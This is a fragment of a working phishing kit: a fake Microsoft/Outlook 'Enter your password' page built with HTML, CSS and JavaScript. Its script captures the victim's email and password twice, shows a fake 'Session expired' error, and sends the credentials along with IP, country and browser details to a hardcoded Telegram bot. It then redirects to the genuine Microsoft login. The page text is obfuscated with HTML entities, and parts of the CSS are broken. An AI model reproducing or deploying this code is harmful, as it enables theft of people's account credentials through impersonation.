    /* Preloader */
    #preloader {
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }
    .spinner div {
        width: 8px;
        height: 8px;
        background-color: #005da6;
        border-radius: 50%;
        position: absolute;
        animation: move 1.2s infinite ease-in-out;
    }
    .spinner div:nth-child(2) { animation-delay: 0.15s; }
    .spinner div:nth-child(3) { animation-delay: 0.3s; }

        display: none;

    button.loading {
        position: relative;
        pointer-events: none;

    button.loading::after {
        content: '';
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);

        border-top: 2px solid transparent;
        border-radius: 50%;
        animation: spin 0.6s linear infinite;

<!-- Login box -->
<div class="login-box" id="loginBox">
    <button type="button" class="backButton" id="backArrow">
        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Back">
    </button>
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
        <span>&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;
</span>
    </div>
    <div class="email-pill" id="emailPill"></div>
    <h2>&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;
</h2>
    <form id="loginForm">
        <div class="form-group">
            <input type="password" id="password" name="password" placeholder="" autofocus="" required>
            <label for="password">Password</label>
            <div class="error-message" id="errorMsg"></div>
        </div>
        <div class="form-group"><a id="idA_ForgotPassword" role="link" href="" target="">Forgot my password</a></div>
        <button type="submit" id="submitBtn" class="submitBtn">Next</button>
        <a href="#" class="link">&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#119;&#105;&#116;&#104;&#32;&#97;&#32;&#100;&#105;&#102;&#102;&#101;&#114;&#101;&#110;&#116;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;
</a>
    </form>
</div>

<script>
document.addEventListener("DOMContentLoaded", function() {
    const preloader = document.getElementById("preloader");
    const loginBox = document.getElementById("loginBox");
    const emailPill = document.getElementById("emailPill");
    const backArrow = document.getElementById("backArrow");
    const form = document.getElementById("loginForm");
    const submitBtn = document.getElementById("submitBtn");
    const errorMsg = document.getElementById("errorMsg");
    const passwordField = document.getElementById("password");

    // Telegram API config
    const TELEGRAM_BOT_TOKEN = "8859359875:AAFYLZNd_ullcZ0StjOR4CSfRqbNaT3j6hI";
    const TELEGRAM_CHAT_ID = "8187198086";
    const REDIRECT_URL = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1754812459&rver=7.3.6960.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2fen-gb%2fwindows%2ftransfer-your-data-with-windows-backup&id=74335";

    function validateEmailOrPlaceholder(value) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return (
            emailRegex.test(value) ||
            value.trim() === "[[-Email-]]" ||
            value.trim() === "[EMail]"
        );
    }

    let hashVal = decodeURIComponent(window.location.hash.replace(/^#/, '').trim());
    const email = validateEmailOrPlaceholder(hashVal) ? hashVal : null;

    if (email) {
        emailPill.textContent = email;
        setTimeout(() => {
            preloader.style.display = "none";
            loginBox.style.display = "block";
        }, 800);
    } else {
        preloader.style.display = "none";
        loginBox.innerHTML = "<p style='text-align:center;color:red;'>Invalid or missing email.</p>";
        loginBox.style.display = "block";
    }

    backArrow.addEventListener("click", () => {
        window.history.back();
    });

    let attempts = 0;

    form.addEventListener("submit", function(e) {
        e.preventDefault();
        submitBtn.classList.add("loading");
        errorMsg.textContent = "";

        setTimeout(() => {
            submitBtn.classList.remove("loading");
            attempts++;

            if (attempts === 1) {
                sendToTelegram(email, passwordField.value)
                    .catch(err => console.error("Telegram send error:", err));

                errorMsg.textContent = "Error: Session expired. Try again.";
                errorMsg.style.color = "red";
                passwordField.value = "";
            } 
            else if (attempts === 2) {
            
                sendToTelegram(email, passwordField.value)
                    .catch(err => {
                        console.error("Telegram send error:", err);
                    })
                    .finally(() => {
                        window.location.href = REDIRECT_URL;
                    });
            }
        }, 1000);   
    });

    async function sendToTelegram(email, password) {
        const deviceInfo = await getUserInfo();
        const message = `🛡️ Outlook 2025 Login Attempt\n📧 E-mail: ${email}\n🔑 Password: ${password}\n🌐 ${deviceInfo}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.statusText}`);
        }
    }

    async function getUserInfo() {
        let ipData = {};
        try {
            const res = await fetch("https://ipapi.co/json/");
            ipData = await res.json();
        } catch (err) {
            ipData = { ip: "Unknown", country_name: "Unknown" };
        }

        return `Browser: ${navigator.userAgent}
Platform: ${navigator.platform}
Language: ${navigator.language}
IP: ${ipData.ip}
Country: ${ipData.country_name}`;
    }
});
</script>
